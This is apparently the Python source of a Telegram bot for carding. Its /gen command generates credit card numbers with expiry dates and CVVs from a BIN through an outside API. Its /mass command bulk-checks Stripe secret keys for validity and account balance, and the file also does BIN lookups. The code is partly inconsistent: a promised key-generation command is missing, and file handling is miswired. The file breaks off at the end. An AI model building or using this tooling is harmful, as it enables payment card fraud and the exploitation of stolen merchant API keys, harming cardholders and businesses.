import requests
import re
import uuid
from user_agent import generate_user_agent
from telegram import Update, Document
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
import logging
import os

# Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual bot token
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")  # You can set this as an environment variable

# Configure logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Global variable to track ongoing process
ongoing_process = False

### ADMIN COMMAND: Ownership ###
OWNER_ID = 123456789  # Replace with your Telegram user ID for admin control

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        'Hello! This bot is managed by [YOUR NAME].'
        '\nSend me a BIN number using /gen command.'
        '\nFor multiple BIN checks, use /mbin followed by a list of BIN numbers or send a .txt file with BIN numbers.'
        '\nUse /bins for batch BIN lookup and /mass for batch Stripe key checking.'
        '\nTo generate secret keys, use /get <amount>.'
    )


### Admin-only command for shutting down bot ###
async def shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id == OWNER_ID:
        await update.message.reply_text('Shutting down the bot as per admin request...')
        os._exit(0)  # Shuts down the bot
    else:
        await update.message.reply_text('You are not authorized to use this command.')


### BIN Lookup ###
async def lookup_multiple_bins(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global ongoing_process
    args = context.args
    if not args:
        await update.message.reply_text('Please provide BIN numbers. Usage: /mbin <BIN_NUMBER1> <BIN_NUMBER2> ...')
        return

    ongoing_process = True
    await update.message.reply_text('Please wait, checking BINs...')
    for bin_number in args:
        if not ongoing_process:
            break
        bin_result = await get_bin_info(bin_number)
        await update.message.reply_text(bin_result)

    if ongoing_process:
        ongoing_process = False
        await update.message.reply_text('✅ BIN checking completed.')


### File Handling (TXT for BINs or Stripe keys) ###
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global ongoing_process
    document = update.message.document
    if document.mime_type == 'text/plain':
        file = await document.get_file()
        content = await file.download_as_bytearray()
        items = content.decode('utf-8').split()

        if context.chat_data.get('current_command') == '/bins':
            ongoing_process = True
            await update.message.reply_text('Please wait, checking BINs...')
            for item in items:
                if not ongoing_process:
                    break
                bin_result = await get_bin_info(item)
                await update.message.reply_text(bin_result)
            if ongoing_process:
                ongoing_process = False
                await update.message.reply_text('✅ BIN checking completed.')
        elif context.chat_data.get('current_command') == '/mass':
            ongoing_process = True
            await update.message.reply_text('Please wait, checking Stripe keys...')
            for item in items:
                if not ongoing_process:
                    break
                stripe_result = await get_stripe_info(update, context, item)
                await update.message.reply_text(stripe_result)
            if ongoing_process:
                ongoing_process = False
                await update.message.reply_text('✅ Stripe key checking completed.')


### API Calls for BIN Info ###
async def get_bin_info(bin_number: str) -> str:
    api_url = f'http://api.nophq.cc/bin/?bin={bin_number}'
    try:
        response = requests.get(api_url)
        if response.status_code == 200:
            data = response.json()
            if data['status']:
                return (f"BIN: {data['bin']}\n"
                        f"Brand: {data['brand']}\n"
                        f"Type: {data['type']}\n"
                        f"Level: {data['level']}\n"
                        f"Bank: {data['bank']}\n"
                        f"Country: {data['country_name']} ({data['country_code']}) {data['flag']}\n"
                        f"Currency: {data['currency']} ({data['currency_symbol']})\n"
                        f"API: {data['api']}")
            else:
                return f'Invalid BIN number: {bin_number}'
        else:
            return f'Failed to retrieve BIN information for {bin_number}. Status code: {response.status_code}'
    except Exception as e:
        logger.error(f'Error checking BIN {bin_number}: {str(e)}')
        return f'Error checking BIN {bin_number}: {str(e)}'


### Stripe Key Checking ###
async def get_stripe_info(update: Update, context: ContextTypes.DEFAULT_TYPE, sk_key: str) -> str:
    api_url = f'http://api.nophq.cc/sk/?sk={sk_key}'
    try:
        response = requests.get(api_url)
        if response.status_code == 200:
            data = response.json()
            if data['result']:
                return (f"Stripe Key Status: {data['result']}\n"
                        f"Response: {data.get('response', 'N/A')}\n"
                        f"Balance: {data.get('balance', 'N/A')}\n"
                        f"Pending Amount: {data.get('pending_amount', 'N/A')}\n"
                        f"Currency: {data.get('currency', 'N/A')}\n"
                        f"API: {data['api']}")
            else:
                return f'Invalid Stripe key: {sk_key}'
        else:
            return f'Failed to check Stripe key {sk_key}. Status code: {response.status_code}'
    except Exception as e:
        logger.error(f'Error checking Stripe key {sk_key}: {str(e)}')
        return f'Error checking Stripe key {sk_key}: {str(e)}'


### Generate Credit Card Numbers from BIN ###
async def generate_card(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global ongoing_process
    args = context.args
    if len(args) != 1:
        await update.message.reply_text('Please provide a BIN number. Usage: /gen <BIN_NUMBER>')
        return

    bin_number = args[0]
    api_url = f'http://api.nophq.cc/gen/?bin={bin_number}'

    ongoing_process = True
    await update.message.reply_text('Please wait, generating cards...')
    try:
        response = requests.get(api_url)
        if response.status_code == 200:
            data = response.json()
            if data['status']:
                cards = data.get('cards', [])
                if cards:
                    result = 'Generated Credit Card Numbers:\n\n'
                    for card in cards:
                        card_number, month, year, cvv = card.split('|')
                        result += (f"Card Number: {card_number}\n"
                                   f"Expiry Date: {month}/{year}\n"
                                   f"CVV: {cvv}\n\n")
                    result += f"API: {data['api']}"
                else:
                    result = 'No cards generated for this BIN number.'
                await update.message.reply_text(result)
            else:
                await update.message.reply_text(f'Invalid BIN number: {bin_number}')
        else:
            await update.message.reply_text(f'Failed to generate credit card numbers for {bin_number}. Status code: {response.status_code}')
    except Exception as e:
        logger.error(f'Error generating card for BIN {bin_number}: {str(e)}')
        await update.message.reply_text(f'Error generating card for BIN {bin_number}: {str(e)}')
    finally:
        ongoing_process = False
        await update.message.reply_text('✅ Generating completed.')


### Main Function for Hosting ###
def main() -> None:
    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("gen", generate_card))
    application.add_handler(CommandHandler("mbin", lookup_multiple_bins))
    application.add_handler(CommandHandler("bins", handle_file))
    application.add_handler(CommandHandler("mass", handle_file))
    application.add_handler(CommandHandler("shutdown", shutdown))  # Admin shutdown command

    application.run_polling()


if __name__ == '__main
